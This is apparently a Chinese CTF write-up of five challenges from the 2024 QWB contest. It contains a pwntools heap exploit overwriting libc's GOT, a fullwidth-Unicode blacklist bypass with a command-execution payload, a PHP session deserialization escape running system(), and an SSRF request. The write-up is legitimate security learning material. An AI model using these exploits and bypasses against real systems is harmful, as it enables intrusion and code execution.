---
title: 第八届强网杯 writeup by Mini-Venom
contest: 强网杯
year: 2024
difficulty: medium
vuln_type: misc_unknown
tags: [baby_heap, libc-got-overwrite, libcdb-search, PyBlockly, Unicode-fullwidth, SUID-find, platform, PHP-session-deserialize, notouchitsclass-eval, proxy-SSRF, snake-BFS]
attack_chain:
  - Pwn baby_heap: malloc(0x700) + malloc(0x10) + free(1) + show(1) 泄 libc_base = -0x21ace0
  - got = libc + 0x21A118, s(p64(got)) + s(p64(libc_base+puts)) 写任意地址
  - sla(': ', '5') + sl('2') 触发利用
  - Web PyBlockly: 全角 Unicode 绕黑名单 - → \uFF0D, . → \uFF0E, / → \uFF0F, = → \uFF1D, > → \uFF1E
  - PyBlockly 内置 python __builtins__.len = lambda x: __import__('os').system('find / -perm -u=s -type f')
  - Web platform: SessionManager 黑名单替换为空 + 序列化逃逸
  - notouchitsclass eval RCE: username=fewww&password[]=systemsystemeval&password[]=";i:1;s:7:"fewww";}a|O:15:"notouchitsclass":1:{s:4:"data";s:20:"system('/readflag');
  - Web proxy: /v2/api/proxy JSON {"url": "http://127.0.0.1:8769/v1/api/flag", "method": "POST"}
  - Web snake: BFS 路径搜索 GRID_SIZE=19 找最优路径
key_payload: 'libc_base = u64 - 0x21ace0 + got = libc + 0x21A118 + 全角 Unicode + pearcmd 序列化逃逸'
one_liner: 第八届强网杯 Mini-Venom：baby_heap 改 libc.got + PyBlockly 全角 Unicode 绕 + platform session 反序列化 + proxy SSRF + snake BFS。
lesson: libc 任意地址写可改自身 .got 劫持；黑名单替换为空是经典 PHP session 序列化逃逸前提；全角 Unicode 同形字符绕是中文 CTF 特色。
quality: high
---

# 第八届强网杯 writeup by Mini-Venom

**来源**: ctfiot.com ID 213637
**战队**: Mini-Venom（ChaMd5 招新广告）

## Pwn

### baby_heap
漏洞：任意地址写，攻击 libc 中的 .got 表；UAF 泄 libc_base

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pwn')
p = process('./pwn')

def malloc(size):
    sla(': ', '1')
    sla('e ', str(size))

def free(idx):
    sla(': ', '2')
    sla(': ', str(idx))

def show(idx):
    sla(': ', '4')
    sla(': \n', str(idx))
    rl('here \n')

malloc(0x700)
malloc(0x10)
free(1)
show(1)
libc_base = u64(p.recv(8)) - 0x21ace0
li(hex(libc_base))

got = libc_base + 0x00000000021A118
sla(': ', '0')
s(p64(got))                      # 写入目标地址
s(p64(libc_base + libc.symbols['puts']))  # 写入 puts 地址
sla(': ', '5')                   # 触发
sl('2')
inter()
```

## Web

### PyBlockly（Google Blockly 沙箱）
**绕黑名单**：特殊字符转全角 Unicode
```python
def convert_to_chinese_unicode(input_string):
    symbol_map = {
        '-': '\uFF0D',
        '.': '\uFF0E',
        '/': '\uFF0F',
        '=': '\uFF1D',
        '>': '\uFF1E',
    }
    converted_string = []
    for char in input_string:
        if char in symbol_map:
            converted_string.append(symbol_map[char])
        else:
            converted_string.append(char)
    return ''.join(converted_string)
```

**Payload**：
```json
{"blocks":{"languageVersion":0,"blocks":[{"type":"text","id":"...","x":146,"y":57,"fields":{"TEXT":"'；＿＿builtins＿＿．len ＝ lambda x： 2\n＿＿import＿＿（＂os＂）．system（＂find ／ －perm －u＝s －type f 2＞／dev／null＂）；'"}}]}}
```

**思路**：覆写 `__builtins__.len` 为 lambda，触发 `__import__('os').system('find / -perm -u=s -type f')` 找 SUID 提权。

### platform（PHP session 反序列化）
- dirsearch 扫源码
- 入口：SessionManager 黑名单替换为空
- 攻击：序列化字符串逃逸 + 触发 notouchitsclass eval
- 反序列化链：`O:15:"notouchitsclass":1:{s:4:"data";s:20:"system('/readflag');"}`

```http
username=fewww&password[]=systemsystemeval&password[]=";i:1;s:7:"fewww";}a|O:15:"notouchitsclass":1:{s:4:"data";s:20:"system('/readflag');
```

- 重定向两次后会执行 eval

### proxy（SSRF）
```http
POST /v2/api/proxy
Content-Type: application/json

{"url":"http://127.0.0.1:8769/v1/api/flag","method":"POST","body":"","headers":{},"follow_redirects":true}
```

### snake（BFS 寻路）
- GRID_SIZE = 19
- 4 方向 UP/DOWN/LEFT/RIGHT
- BFS 找最优路径

```python
DIRECTIONS = {"UP": {"direction": "UP"}, ...}
OPPOSITE_DIRECTION = {"UP": "DOWN", ...}
```

## 评价
Mini-Venom 战队在第八届强网杯的 5 题全解：Pwn 改 libc.got + Web PyBlockly 全角 Unicode 绕 + platform PHP session 反序列化 + proxy SSRF + snake BFS。是中级 Web/Pwn 综合实战，体现多技能融合。
